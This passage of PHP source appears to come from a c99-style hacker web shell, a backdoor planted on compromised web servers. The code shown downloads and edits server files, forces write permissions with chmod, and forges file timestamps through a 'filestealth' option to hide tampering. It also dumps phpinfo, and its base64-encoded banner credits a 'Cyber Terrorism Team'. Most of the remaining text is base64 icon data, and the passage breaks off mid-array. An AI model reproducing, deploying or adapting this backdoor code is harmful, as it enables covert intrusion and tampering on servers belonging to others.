echo($r); 
exit;
  }
  elseif ($ft == "notepad")
  {
@ob_clean();
header("Content-type: text/plain"); 
header("Content-disposition: attachment; filename=\"".$f.".txt\";"); 
echo($r); 
exit;
  }
  elseif ($ft == "img")
  {
if (!$white)
{
 echo "<center><img src=\"".$sul."act=f&f=".urlencode($f)."&ft=img&white=1&d=".urlencode($d)."\" border=\"1\"></center>";
}
else
{
 @ob_clean();
 $ext = explode($f,".");
 $ext = $ext[count($ext)-1];
 header("Content-type: image/gif"); 
 echo($r); 
 exit;
}
  }
  elseif ($ft == "edit")
  {
if (!empty($submit))
{
 if ($filestealth) {$stat = stat($d.$f);}
 if (!is_writable($d.$f) and $autochmod) {@chmod($d.$f,$autochmod);}
 $fp = fopen($d.$f,"w");
 if (!$fp) {echo "<b>Can't write to file!</b>";}
 else
 {
  echo "<b>Ñîõðàí¸íü!!!</b>";
  fwrite($fp,$nfcontent);
  fclose($fp);
  if ($filestealth) {touch($d.$f,$stat[9],$stat[8]);}
  $r = $nfcontent;
 }
}
$rows = count(explode("
",$r));
if ($rows < 10) {$rows = 10;}
if ($rows > 30) {$rows = 30;}
echo "<form method=\"POST\"><input type=\"submit\" name=\"submit\" value=\"Ñîõðàíèòü\">&nbsp;<input type=\"reset\" value=\"Ñáðîñ\">&nbsp;<br><textarea name=\"nfcontent\" cols=\"122\" rows=\"".$rows."\">".htmlspecialchars($r)."</textarea></form>";
  }
  elseif (!empty($ft)) {echo "<center><b>Manually selected type is incorrect. If you think, it is mistake, please send us url and dump of \$GLOBALS.</b></center>";}
  else {echo "<center><b>Unknown extension (".$ext."), please, select type manually.</b></center>";}
 }
}
if ($act == "phpinfo")
{
 ob_end_clean();
 phpinfo();
 exit;
}
}
$data = base64_decode("PGNlbnRlcj48Zm9udCBzaXplPTIgY29sb3I9IzAwZmYwMD5DeWJlciBUZXJyb3Jpc20gVGVhbTwvZm9udD48YnI+PGZvbnQgc2l6ZT0yPg0KyOTl/ywg6Ofs5e3l7ej/IOTo5+Dp7eAg6CDx6vDo7/LgIOTu4eDi6Os6PC9mb250PjxpbWcgc3JjPWh0dHA6Ly9vbmxpbmUubWlyYWJpbGlzLmNvbS9zY3JpcHRzL29ubGluZS5kbGw/aWNxPTMzNTk3NjAyMSZpbWc9NSBoZWlnaHQ9MTggd2lkdGg9MTg+PGZvbnQgc2l6ZT0yIGNvbG9yPSNGRkRFMDA+IFJPRE5PQzwvZm9udD48L2NlbnRlcj4=");
if ($act == "img")
{
 @ob_clean();
 
 $arrimg = array(
"arrow_ltr"=>
"R0lGODlhJgAWAIAAAAAAAP///yH5BAUUAAEALAAAAAAmABYAAAIvjI+py+0PF4i0gVvzuVxXDnoQ".
"SIrUZGZoerKf28KjPNPOaku5RfZ+uQsKh8RiogAAOw==",
"back"=>
"R0lGODlhFAAUAKIAAAAAAP///93d3cDAwIaGhgQEBP///wAAACH5BAEAAAYALAAAAAAUABQAAAM8".
"aLrc/jDKSWWpjVysSNiYJ4CUOBJoqjniILzwuzLtYN/3zBSErf6kBW+gKRiPRghPh+EFK0mOUEqt".
"Wg0JADs=",
"buffer"=>
"R0lGODlhFAAUAKIAAAAAAP////j4+N3d3czMzLKysoaGhv///yH5BAEAAAcALAAAAAAUABQAAANo".
"eLrcribG90y4F1Amu5+NhY2kxl2CMKwrQRSGuVjp4LmwDAWqiAGFXChg+xhnRB+ptLOhai1crEmD".
"Dlwv4cEC46mi2YgJQKaxsEGDFnnGwWDTEzj9jrPRdbhuG8Cr/2INZIOEhXsbDwkAOw==",
"change"=>
"R0lGODlhFAAUAMQfAL3hj7nX+pqo1ejy/f7YAcTb+8vh+6FtH56WZtvr/RAQEZecx9Ll/PX6/v3+".
"/3eHt6q88eHu/ZkfH3yVyIuQt+72/kOm99fo/P8AZm57rkGS4Hez6pil9oep3GZmZv///yH5BAEA".
"AB8ALAAAAAAUABQAAAWf4CeOZGme6NmtLOulX+c4TVNVQ7e9qFzfg4HFonkdJA5S54cbRAoFyEOC".
"wSiUtmYkkrgwOAeA5zrqaLldBiNMIJeD266XYTgQDm5Rx8mdG+oAbSYdaH4Ga3c8JBMJaXQGBQgA".
"CHkjE4aQkQ0AlSITan+ZAQqkiiQPj1AFAaMKEKYjD39QrKwKAa8nGQK8Agu/CxTCsCMexsfIxjDL".
"zMshADs=",
"delete"=>
"R0lGODlhFAAUAOZZAPz8/NPFyNgHLs0YOvPz8/b29sacpNXV1fX19cwXOfDw8Kenp/n5+etgeunp".
"6dcGLMMpRurq6pKSktvb2+/v7+1wh3R0dPnP17iAipxyel9fX7djcscSM93d3ZGRkeEsTevd4LCw".
"sGRkZGpOU+IfQ+EQNoh6fdIcPeHh4YWFhbJQYvLy8ui+xm5ubsxccOx8kcM4UtY9WeAdQYmJifWv".
"vHx8fMnJycM3Uf3v8rRue98ONbOzs9YFK5SUlKYoP+Tk5N0oSufn57ZGWsQrR9kIL5CQkOPj42Vl".
"ZeAPNudAX9sKMPv7+15QU5ubm39/f8e5u4xiatra2ubKz8PDw+pfee9/lMK0t81rfd8AKf///wAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5".
"BAEAAFkALAAAAAAUABQAAAesgFmCg4SFhoeIhiUfIImIMlgQB46GLAlYQkaFVVhSAIZLT5cbEYI4".
"STo5MxOfhQwBA1gYChckQBk1OwiIALACLkgxJilTBI69RFhDFh4HDJRZVFgPPFBR0FkNWDdMHA8G".
"BZTaMCISVgMC4IkVWCcaPSi96OqGNFhKI04dgr0QWFcKDL3A4uOIjVZZABxQIWDBLkIEQrRoQsHQ".
"jwVFHBgiEGQFIgQasYkcSbJQIAA7",
"download"=>
"R0lGODlhEQAPAKIAAO/v8N3e387OzpSt72NzrVFZfCkxUv///yH5BAUUAAcALAAAAAARAA8AAANSe".
"Grc3uoYAEq4wWZqFtWXVnBehWUhKQ1V4b6uagwsZd/ATO84ru+0k/C3MxCOSIyDZhQ4nYRnZ2UQRJ9".
"W6aKaxV4F02r1CwWDF2bYyzyVPN6dBAA7",
"edit"=>
"R0lGODlhFAAUALMAAAAAAP///93d3czMzLKysoaGhmZmZl9fXwQEBP///wAAAAAAAAAAAAAAAAAA".
"AAAAACH5BAEAAAkALAAAAAAUABQAAAR0MMlJqyzFalqEQJuGEQSCnWg6FogpkHAMF4HAJsWh7/ze".
"EQYQLUAsGgM0Wwt3bCJfQSFx10yyBlJn8RfEMgM9X+3qHWq5iED5yCsMCl111knDpuXfYls+IK61".
"LXd+WWEHLUd/ToJFZQOOj5CRjiCBlZaXIBEAOw==",
"forward"=>
"R0lGODlhFAAUAPIAAAAAAP///93d3cDAwIaGhgQEBP///wAAACH5BAEAAAYALAAAAAAUABQAAAM8".
"aLrc/jDK2Qp9xV5WiN5G50FZaRLD6IhE66Lpt3RDbd9CQFSE4P++QW7He7UKPh0IqVw2l0RQSEqt".
"WqsJADs=",
"home"=>
"R0lGODlhFAAUALMAAAAAAP///+rq6t3d3czMzLKysoaGhmZmZgQEBP///wAAAAAAAAAAAAAAAAAA".
"AAAAACH5BAEAAAkALAAAAAAUABQAAAR+MMk5TTWI6ipyMoO3cUWRgeJoCCaLoKO0mq0ZxjNSBDWS".
"krqAsLfJ7YQBl4tiRCYFSpPMdRRCoQOiL4i8CgZgk09WfWLBYZHB6UWjCequwEDHuOEVK3QtgN/j".
"VwMrBDZvgF+ChHaGeYiCBQYHCH8VBJaWdAeSl5YiW5+goBIRADs=",
"mode"=>
"R0lGODlhHQAUALMAAAAAAP///6CgpN3d3czMzIaGhmZmZl9fX////wAAAAAAAAAAAAAAAAAAAAAA".
"AAAAACH5BAEAAAgALAAAAAAdABQAAASBEMlJq70461m6/+AHZMUgnGiqniNWHHAsz3F7FUGu73xO".
"2BZcwGDoEXk/Uq4ICACeQ6fzmXTlns0ddle99b7cFvYpER55Z10Xy1lKt8wpoIsACrdaqBpYEYK/".
"dH1LRWiEe0pRTXBvVHwUd3o6eD6OHASXmJmamJUSY5+gnxujpBIRADs=",
"refresh"=>
"R0lGODlhEQAUALMAAAAAAP////Hx8erq6uPj493d3czMzLKysoaGhmZmZl9fXwQEBP///wAAAAAA".
"AAAAACH5BAEAAAwALAAAAAARABQAAAR1kMlJq0Q460xR+GAoIMvkheIYlMyJBkJ8lm6YxMKi6zWY".
"3AKCYbjo/Y4EQqFgKIYUh8EvuWQ6PwPFQJpULpunrXZLrYKx20G3oDA7093Esv19q5O/woFu9ZAJ".
"R3lufmWCVX13h3KHfWWMjGBDkpOUTTuXmJgRADs=",
"search"=>
"R0lGODlhFAAUALMAAAAAAP///+rq6t3d3czMzMDAwLKysoaGhnd3d2ZmZl9fX01NTSkpKQQEBP//".
"/wAAACH5BAEAAA4ALAAAAAAUABQAAASn0Ml5qj0z5xr6+JZGeUZpHIqRNOIRfIYiy+a6vcOpHOap".
"s5IKQccz8XgK4EGgQqWMvkrSscylhoaFVmuZLgUDAnZxEBMODSnrkhiSCZ4CGrUWMA+LLDxuSHsD".
"AkN4C3sfBX10VHaBJ4QfA4eIU4pijQcFmCVoNkFlggcMRScNSUCdJyhoDasNZ5MTDVsXBwlviRmr".
"Cbq7C6sIrqawrKwTv68iyA6rDhEAOw==",
"setup"=>
"R0lGODlhFAAUAMQAAAAAAP////j4+OPj493d3czMzMDAwLKyspaWloaGhnd3d2ZmZl9fX01NTUJC".
"QhwcHP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEA".
"ABAALAAAAAAUABQAAAWVICSKikKWaDmuShCUbjzMwEoGhVvsfHEENRYOgegljkeg0PF4KBIFRMIB".
"qCaCJ4eIGQVoIVWsTfQoXMfoUfmMZrgZ2GNDPGII7gJDLYErwG1vgW8CCQtzgHiJAnaFhyt2dwQE".
"OwcMZoZ0kJKUlZeOdQKbPgedjZmhnAcJlqaIqUesmIikpEixnyJhulUMhg24aSO6YyEAOw==",
"small_dir"=>
"R0lGODlhDgAQALMPAKt5E8uYM7SBHLyJJMaTLsGOKaRyDJ5sBv/MZ//////ge//rhf/Ub//3kf//m".
"f///yH5BAEAAA8ALAAAAAAOABAAAARF8MlJq704axo6yUEiJsUVOqiTDIPgSkEjz6MIPMGi7/xyE4q".
"gcKj4MY7IJONWQDifUAQzSr0NqFErFnp7uASAsMFwKD8iADs=",
"small_unk"=>
"R0lGODlhEQAUANUhAOXl1c3MzJiYmCkufnoRE83MzTNOoszLzO4jI/HqQIeGh5iYlxZ7PRh8PXLM".
"2FRVVMvLyzRNofbHPnsRE+bm1QgJCebl1FRUVFVVVIaGh1VVVQcICCoufoaFhYWGhszMzP///wAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAACEALAAAAAARABQAAAaewJBw".
"SCwaj0hPZpnxOD2dhdFDsVgBV4tAU+yAvmCwAHQhesNhwQVTFnoVS2gn0/FsIJiht8ORcP4DfxVk".
"QxkgfIF/gBuEQh6HaF8WjHmOIIYJBF8GIBSUQ49eBAggBg4RniBclo8gE18MDQCDqyGhAFUUuLi0".
"oCAbFRvAwcCMtWeRYW0hGQcfAc/QBQEFzpUhbBoaGNsP2mtrSOLjSEEAOw==",
"sort_asc"=>
"R0lGODlhDgAJAKIAAAAAAP///9TQyICAgP///wAAAAAAAAAAACH5BAEAAAQALAAAAAAOAAkAAAMa".
"SLrcPcE9GKUaQlQ5sN5PloFLJ35OoK6q5SYAOw==",
"sort_desc"=>
"R0lGODlhDgAJAKIAAAAAAP///9TQyICAgP///wAAAAAAAAAAACH5BAEAAAQALAAAAAAOAAkAAAMb".
"SLrcOjBCB4UVITgyLt5ch2mgSJZDBi7p6hIJADs=",
"sql_button_drop"=>
"R0lGODlhCQALAPcAAAAAAIAAAACAAICAAAAAgIAAgACAgICAgMDAwP8AAAD/AP//AAAA//8A/wD/".
"/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMwAAZgAAmQAAzAAA/wAzAAAzMwAzZgAzmQAzzAAz/wBm".
"AABmMwBmZgBmmQBmzABm/wCZAACZMwCZZgCZmQCZzACZ/wDMAADMMwDMZgDMmQDMzADM/wD/AAD/".
"MwD/ZgD/mQD/zAD//zMAADMAMzMAZjMAmTMAzDMA/zMzADMzMzMzZjMzmTMzzDMz/zNmADNmMzNm".
"ZjNmmTNmzDNm/zOZADOZMzOZZjOZmTOZzDOZ/zPMADPMMzPMZjPMmTPMzDPM/zP/ADP/MzP/ZjP/".
"mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm".
"zGZm/2aZAGaZM2aZZmaZmWaZzGaZ/2bMAGbMM2bMZmbMmWbMzGbM/2b/AGb/M2b/Zmb/mWb/zGb/".
"/5kAAJkAM5kAZpkAmZkAzJkA/5kzAJkzM5kzZpkzmZkzzJkz/5lmAJlmM5lmZplmmZlmzJlm/5mZ".
"AJmZM5mZZpmZmZmZzJmZ/5nMAJnMM5nMZpnMmZnMzJnM/5n/AJn/M5n/Zpn/mZn/zJn//8wAAMwA".
"M8wAZswAmcwAzMwA/8wzAMwzM8wzZswzmcwzzMwz/8xmAMxmM8xmZsxmmcxmzMxm/8yZAMyZM8yZ".
"ZsyZmcyZzMyZ/8zMAMzMM8zMZszMmczMzMzM/8z/AMz/M8z/Zsz/mcz/zMz///8AAP8AM/8AZv8A".
"mf8AzP8A//8zAP8zM/8zZv8zmf8zzP8z//9mAP9mM/9mZv9mmf9mzP9m//+ZAP+ZM/+ZZv+Zmf+Z".
"zP+Z///MAP/MM//MZv/Mmf/MzP/M////AP//M///Zv//mf//zP///yH5BAEAABAALAAAAAAJAAsA".
"AAg4AP8JREFQ4D+CCBOi4MawITeFCg/iQhEPxcSBlFCoQ5Fx4MSKv1BgRGGMo0iJFC2ehHjSoMt/".
"AQEAOw==",
"sql_button_empty"=>
"R0lGODlhCQAKAPcAAAAAAIAAAACAAICAAAAAgIAAgACAgICAgMDAwP8AAAD/AP//AAAA//8A/wD/".
"/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMwAAZgAAmQAAzAAA/wAzAAAzMwAzZgAzmQAzzAAz/wBm".
"AABmMwBmZgBmmQBmzABm/wCZAACZMwCZZgCZmQCZzACZ/wDMAADMMwDMZgDMmQDMzADM/wD/AAD/".
"MwD/ZgD/mQD/zAD//zMAADMAMzMAZjMAmTMAzDMA/zMzADMzMzMzZjMzmTMzzDMz/zNmADNmMzNm".
"ZjNmmTNmzDNm/zOZADOZMzOZZjOZmTOZzDOZ/zPMADPMMzPMZjPMmTPMzDPM/zP/ADP/MzP/ZjP/".
"mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm".
"zGZm/2aZAGaZM2aZZmaZmWaZzGaZ/2bMAGbMM2bMZmbMmWbMzGbM/2b/AGb/M2b/Zmb/mWb/zGb/".
"/5kAAJkAM5kAZpkAmZkAzJkA/5kzAJkzM5kzZpkzmZkzzJkz/5lmAJlmM5lmZplmmZlmzJlm/5mZ".
"AJmZM5mZZpmZmZmZzJmZ/5nMAJnMM5nMZpnMmZnMzJnM/5n/AJn/M5n/Zpn/mZn/zJn//8wAAMwA".
"M8wAZswAmcwAzMwA/8wzAMwzM8wzZswzmcwzzMwz/8xmAMxmM8xmZsxmmcxmzMxm/8yZAMyZM8yZ".
"ZsyZmcyZzMyZ/8zMAMzMM8zMZszMmczMzMzM/8z/AMz/M8z/Zsz/mcz/zMz///8AAP8AM/8AZv8A".
"mf8AzP8A//8zAP8zM/8zZv8zmf8zzP8z//9mAP9mM/9mZv9mmf9mzP9m//+ZAP+ZM/+ZZv+Zmf+Z".
"zP+Z///MAP/MM//MZv/Mmf/MzP/M////AP//M///Zv//mf//zP///yH5BAEAABAALAAAAAAJAAoA".
"AAgjAP8JREFQ4D+CCBOiMMhQocKDEBcujEiRosSBFjFenOhwYUAAOw==",
"sql_button_insert"=>
"R0lGODlhDQAMAPcAAAAAAIAAAACAAICAAAAAgIAAgACAgICAgMDAwP8AAAD/AP//AAAA//8A/wD/".
"/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMwAAZgAAmQAAzAAA/wAzAAAzMwAzZgAzmQAzzAAz/wBm".
"AABmMwBmZgBmmQBmzABm/wCZAACZMwCZZgCZmQCZzACZ/wDMAADMMwDMZgDMmQDMzADM/wD/AAD/".
"MwD/ZgD/mQD/zAD//zMAADMAMzMAZjMAmTMAzDMA/zMzADMzMzMzZjMzmTMzzDMz/zNmADNmMzNm".
"ZjNmmTNmzDNm/zOZADOZMzOZZjOZmTOZzDOZ/zPMADPMMzPMZjPMmTPMzDPM/zP/ADP/MzP/ZjP/".
"mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm".
"zGZm/2aZAGaZM2aZZmaZmWaZzGaZ/2bMAGbMM2bMZmbMmWbMzGbM/2b/AGb/M2b/Zmb/mWb/zGb/".
"/5kAAJkAM5kAZpkAmZkAzJkA/5kzAJkzM5kzZpkzmZkzzJkz/5lmAJlmM5lmZplmmZlmzJlm/5mZ".
"AJmZM5mZZpmZmZmZzJmZ/5nMAJnMM5nMZpnMmZnMzJnM/5n/AJn/M5n/Zpn/mZn/zJn//8wAAMwA".
"M8wAZswAmcwAzMwA/8wzAMwzM8wzZswzmcwzzMwz/8xmAMxmM8xmZsxmmcxmzMxm/8yZAMyZM8yZ".
"ZsyZmcyZzMyZ/8zMAMzMM8zMZszMmczMzMzM/8z/AMz/M8z/Zsz/mcz/zMz///8AAP8AM/8AZv8A".
"mf8AzP8A//8zAP8zM/8zZv8zmf8zzP8z//9mAP9mM/9mZv9mmf9mzP9m//+ZAP+ZM/+ZZv+Zmf+Z".
"zP+Z///MAP/MM//MZv/Mmf/MzP/M////AP//M///Zv//mf//zP///yH5BAEAABAALAAAAAANAAwA".
"AAgzAFEIHEiwoMGDCBH6W0gtoUB//1BENOiP2sKECzNeNIiqY0d/FBf+y0jR48eQGUc6JBgQADs=",
"up"=>
"R0lGODlhFAAUALMAAAAAAP////j4+OPj493d3czMzLKysoaGhk1NTf///wAAAAAAAAAAAAAAAAAA".
"AAAAACH5BAEAAAkALAAAAAAUABQAAAR0MMlJq734ns1PnkcgjgXwhcNQrIVhmFonzxwQjnie27jg".
"+4Qgy3XgBX4IoHDlMhRvggFiGiSwWs5XyDftWplEJ+9HQCyx2c1YEDRfwwfxtop4p53PwLKOjvvV".
"IXtdgwgdPGdYfng1IVeJaTIAkpOUlZYfHxEAOw==",
"write"=>
"R0lGODlhFAAUALMAAAAAAP///93d3czMzLKysoaGhmZmZl9fXwQEBP///wAAAAAAAAAAAAAAAAAA".
"AAAAACH5BAEAAAkALAAAAAAUABQAAAR0MMlJqyzFalqEQJuGEQSCnWg6FogpkHAMF4HAJsWh7/ze".
"EQYQLUAsGgM0Wwt3bCJfQSFx10yyBlJn8RfEMgM9X+3qHWq5iED5yCsMCl111knDpuXfYls+IK61".
"LXd+WWEHLUd/ToJFZQOOj5CRjiCBlZaXIBEAOw==",
"ext_ani"=>
"R0lGODlhEAAQADMAACH5BAEAAAgALAAAAAAQABAAgwAAAP/////MmczMmf/MzJmZZszMzP//zAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARbEMmJAKC4XhCKvRhABJZgACY4oSR3HmdFcQLndaVK7ziu".
"VQRBYBAI1IKWYrLIJBhwrBqzOHKCotMRcaCbBrRDz+pLHQ65IWOZKE4Lz+hM5SAcDNoZwOBAINxV".
"EQA7",
"ext_asp"=>
"R0lGODdhEAAQALMAAAAAAIAAAACAAICAAAAAgIAAgACAgMDAwICAgP8AAAD/AP//AAAA//8A/wD/".
"/////ywAAAAAEAAQAAAESvDISasF2N6DMNAS8Bxfl1UiOZYe9aUwgpDTq6qP/IX0Oz7AXU/1eRgI".
"D6HPhzjSeLYdYabsDCWMZwhg3WWtKK4QrMHohCAS+hABADs=",
"ext_au"=>
"R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP///4CAgMDAwICAAP//AAAAAAAAAANU".
"aGrS7iuKQGsYIqpp6QiZRDQWYAILQQSA2g2o4QoASHGwvBbAN3GX1qXA+r1aBQHRZHMEDSYCz3fc".
"IGtGT8wAUwltzwWNWRV3LDnxYM1ub6GneDwBADs=",
"ext_avi"=>
"R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAggAAAP///4CAgMDAwP8AAAAAAAAAAAAAAANM".
"WFrS7iuKQGsYIqpp6QiZ1FFACYijB4RMqjbY01DwWg44gAsrP5QFk24HuOhODJwSU/IhBYTcjxe4".
"PYXCyg+V2i44XeRmSfYqsGhAAgA7",
"ext_bat"=>
"R0lGODlhEAAQACIAACH5BAEAAAcALAAAAAAQABAAggAAAP///4CAgMDAwAAAgICAAP//AAAAAANI".
"eLrcJzDKCYe9+AogBvlg+G2dSAQAipID5XJDIM+0zNJFkdL3DBg6HmxWMEAAhVlPBhgYdrYhDQCN".
"dmrYAMn1onq/YKpjvEgAADs=",
"ext_bin"=>
"R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAgv///wAAAICAgMDAwICAAP//AAAAAAAAAANJ".
"aLLc9lCASecQ8MlKB8ARRwVkEIqdqU0EEXCDqkxB4VZxSBTB8lqyTSD2+eVWE0lP8DrORgMiwLkZ".
"/aZBVOqkpUa/4KisRC6rEgA7",
"ext_bmp"=>
"R0lGODlhEAAQADMAACH5BAEAAAoALAAAAAAQABAAgwAAAMDAwP///4CAgIAAAICAAP//AP8AAAAA".
"gAAA/wAAAAAAAAAAAAAAAAAAAAAAAARgUKlBqx0yDyEACBxHZRMXDGC4YQOwCVQKdJ7bggcBtl8Q".
"AJNfIBcoGD4CH1CBSAByxp5pOUAgCFFf6HexIKeore+2BaJ8p1sqaU6NpdOgiQJny5On+u+e7qH3".
"EzWCgwARADs=",
"ext_cat"=>
"R0lGODlhEAAQADMAACH5BAEAAAgALAAAAAAQABAAg4CAgAAAAMDAwP///wAA/wAAgACAAAD/AAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARdEMk5gQU0IyuOMUV1XYf3ESEgrCwQnGgQAENdjwCBFjO7".
"Xj9AaYbjFArBme1mKeiQLpWvqdMJosXB1akKbGxSzvXqVXEGNKDAuyGq0NqriyJTW2QaRP3Ozktk".
"fRQRADs=",
"ext_cgi"=>
"R0lGODlhEAAQAGYAACH5BAEAAEwALAAAAAAQABAAhgAAAJtqCHd3d7iNGa+HMu7er9GiC6+IOOu9".
"DkJAPqyFQql/N/Dlhsyyfe67Af/SFP/8kf/9lD9ETv/PCv/cQ//eNv/XIf/ZKP/RDv/bLf/cMah6".
"LPPYRvzgR+vgx7yVMv/lUv/mTv/fOf/MAv/mcf/NA//qif/MAP/TFf/xp7uZVf/WIP/OBqt/Hv/S".
"Ev/hP+7OOP/WHv/wbHNfP4VzV7uPFv/pV//rXf/ycf/zdv/0eUNJWENKWsykIk9RWMytP//4iEpQ".
"Xv/9qfbptP/uZ93GiNq6XWpRJ//iQv7wsquEQv/jRAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAeegEyCg0wBhIeHAYqIjAEwhoyEAQQXBJCRhQMuA5eSiooGIwafi4UM".
"BagNFBMcDR4FQwwBAgEGSBBEFSwxNhAyGg6WAkwCBAgvFiUiOBEgNUc7w4ICND8PKCFAOi0JPNKD".
"AkUnGTkRNwMS34MBJBgdRkJLCD7qggEPKxsJKiYTBweJkjhQkk7AhxQ9FqgLMGBGkG8KFCg8JKAi".
"RYtMAgEAOw==",
"ext_cmd"=>
"R0lGODlhEAAQACIAACH5BAEAAAcALAAAAAAQABAAggAAAP///4CAgMDAwAAAgICAAP//AAAAAANI".
"eLrcJzDKCYe9+AogBvlg+G2dSAQAipID5XJDIM+0zNJFkdL3DBg6HmxWMEAAhVlPBhgYdrYhDQCN".
"dmrYAMn1onq/YKpjvEgAADs=",
"ext_cnf"=>
"R0lGODlhEAAQACIAACH5BAEAAAcALAAAAAAQABAAggAAAP///4CAgMDAwAAAgAAA/wD//wAAAANK".
"CLqs9weESSuAMZQSiPfBBUlVIJyo8EhbJ5TTRVJvM8gaR9TGRtyZSm1T+OFau87HGKQNnlBgA5Cq".
"Yh4vWOz6ikZFoynjSi6byQkAOw==",
"ext_com"=>
"R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAgv///wAAAICAgMDAwICAAP//AAAAAAAAAANJ".
"aLLc9lCASecQ8MlKB8ARRwVkEIqdqU0EEXCDqkxB4VZxSBTB8lqyTSD2+eVWE0lP8DrORgMiwLkZ".
"/aZBVOqkpUa/4KisRC6rEgA7",
"ext_cov"=>
"R0lGODdhEAAQALMAAAAAAIAAAACAAICAAAAAgIAAgACAgMDAwICAgP8AAAD/AP//AAAA//8A/wD/".
"/////ywAAAAAEAAQAAAEUxDJKY+9Fr3ND/JV9lASAHCV9mHPybXay7kb4LUmILWziOiPwaB1IH5i".
"uMVCaLGBRhOT0pQBri6mQEL3Q8py0ZwYTLE5b6Aw9lw+Y6glN2Ytt0QAADs=",
"ext_cpc"=>
"R0lGODlhEAAQADMAACH5BAEAAAgALAAAAAAQABAAgwAAAP///wCAAMDAwAAAgP//AICAgICAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARYEIlJK0VYmDE294YAZEMQFCZ6DiJpBsNRmuwoDephHGqd".
"GanYLBCyCYavYOsWIDQJUKePeXr1lprmM1ooklRJGrbkjEJhY7B6qvlwOh+sZb5EAO74PB4RAQA7",
"ext_cpl"=>
"R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAgv///wAAAICAgMDAwICAAP//AAAAAAAAAANJ".
"aLLc9lCASecQ8MlKB8ARRwVkEIqdqU0EEXCDqkxB4VZxSBTB8lqyTSD2+eVWE0lP8DrORgMiwLkZ".
"/aZBVOqkpUa/4KisRC6rEgA7",
"ext_cpp"=>
"R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAgv///wAAAAAAgICAgMDAwAAAAAAAAAAAAANC".
"WLPc9XCASScZ8MlKicobBwRkEIkVYWqT4FICoJ5v7c6s3cqrArwinE/349FiNoFw44rtlqhOL4Ra".
"Eq7YrLDE7a4SADs=",
"ext_crl"=>
"R0lGODlhEAAQADMAACH5BAEAAAgALAAAAAAQABAAgwAAAP///wCAAMDAwAAAgP//AICAgICAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARYEIlJK0VYmDE294YAZEMQFCZ6DiJpBsNRmuwoDephHGqd".
"GanYLBCyCYavYOsWIDQJUKePeXr1lprmM1ooklRJGrbkjEJhY7B6qvlwOh+sZb5EAO74PB4RAQA7",
"ext_crt"=>
"R0lGODlhEAAQADMAACH5BAEAAAgALAAAAAAQABAAgwAAAP///wCAAMDAwAAAgP//AICAgICAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARYEIlJK0VYmDE294YAZEMQFCZ6DiJpBsNRmuwoDephHGqd".
"GanYLBCyCYavYOsWIDQJUKePeXr1lprmM1ooklRJGrbkjEJhY7B6qvlwOh+sZb5EAO74PB4RAQA7",
"ext_css"=>
"R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP///8DAwICAgICAAP//AAAAAAAAAANL".
"aArB3ioaNkK9MNbHs6lBKIoCoI1oUJ4N4DCqqYBpuM6hq8P3hwoEgU3mawELBEaPFiAUAMgYy3VM".
"SnEjgPVarHEHgrB43JvszsQEADs=",
"ext_diz"=>
"R0lGODlhEAAQAHcAACH5BAEAAJUALAAAAAAQABAAhwAAAP///15phcfb6NLs/7Pc/+P0/3J+l9bs".
"/52nuqjK5/n///j///7///r//0trlsPn/8nn/8nZ5trm79nu/8/q/9Xt/9zw/93w/+j1/9Hr/+Dv".
"/d7v/73H0MjU39zu/9br/8ne8tXn+K6/z8Xj/LjV7dDp/6K4y8bl/5O42Oz2/7HW9Ju92u/9/8T3".
"/+L//+7+/+v6/+/6/9H4/+X6/+Xl5Pz//+/t7fX08vD//+3///P///H///P7/8nq/8fp/8Tl98zr".
"/+/z9vT4++n1/b/k/dny/9Hv/+v4/9/0/9fw/8/u/8vt/+/09xUvXhQtW4KTs2V1kw4oVTdYpDZX".
